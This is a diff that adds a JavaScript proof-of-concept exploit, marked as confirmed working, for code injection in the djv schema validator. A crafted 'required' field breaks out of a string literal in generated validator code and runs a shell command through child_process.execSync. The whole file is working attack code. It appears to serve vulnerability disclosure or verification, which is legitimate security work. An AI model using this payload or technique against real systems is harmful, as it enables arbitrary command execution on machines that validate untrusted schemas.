@@ -1,0 +1,36 @@
+Confirmed working exploit.
+
+```javascript
+// Exploit for arbitrary code injection in djv's `tpl()` templater.
+//
+// djv builds validator functions by string-concatenating schema-derived
+// values into JS source (see lib/utils/template.js `tpl`), then compiles it
+// with `new Function('schema', source)(schema)`. The `required` validator
+// (lib/validators/required.js) inserts each entry of `schema.required`
+// straight into a double-quoted string literal without escaping:
+//
+//   const condition = '!%s.hasOwnProperty("%s")';
+//   tpl(`if (${condition}) ${error}`, tpl.data, name);
+//
+// Because `tpl`'s %s substitution just does raw string interpolation, a
+// `required` entry containing a `"` breaks out of the string literal and
+// injects arbitrary JavaScript into the generated validator function body.
+
+const djv = require("./node_modules/djv");
+const env = djv();
+
+// Breaks out of the hasOwnProperty("...") string literal, runs a shell
+// command, then reopens a dummy string literal so the rest of the line
+// stays syntactically valid.
+const payload = 'x")){process.mainModule.require("child_process").execSync("touch /tmp/pwned_djv");}if(("';
+
+env.addSchema("evil", {
+  type: "object",
+  required: [payload],
+});
+
+// Compiling/running the generated validator executes the injected code.
+env.validate("evil", {});
+
+console.log("Injected command executed — check /tmp/pwned_djv");
+```
